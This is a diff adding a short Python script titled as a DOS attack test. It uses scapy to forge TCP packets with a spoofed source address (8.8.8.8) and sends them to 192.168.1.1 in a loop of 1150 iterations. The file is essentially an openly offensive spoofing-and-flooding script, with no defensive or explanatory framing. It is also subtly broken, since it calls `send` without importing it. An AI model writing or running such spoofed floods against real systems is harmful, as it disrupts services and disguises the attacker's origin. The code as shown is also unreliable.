@@ -1,0 +1,17 @@
+
+
+
+
+#DOS attack test
+
+#----code---
+from scapy.all import IP, TCP
+
+# Create a new packet with a custom source IP address
+packet = IP(src="8.8.8.8", dst="192.168.1.1") / TCP()
+
+# Display the packet details
+#print(packet.show())
+
+for i in range (0, 1150):
+    send(packet)
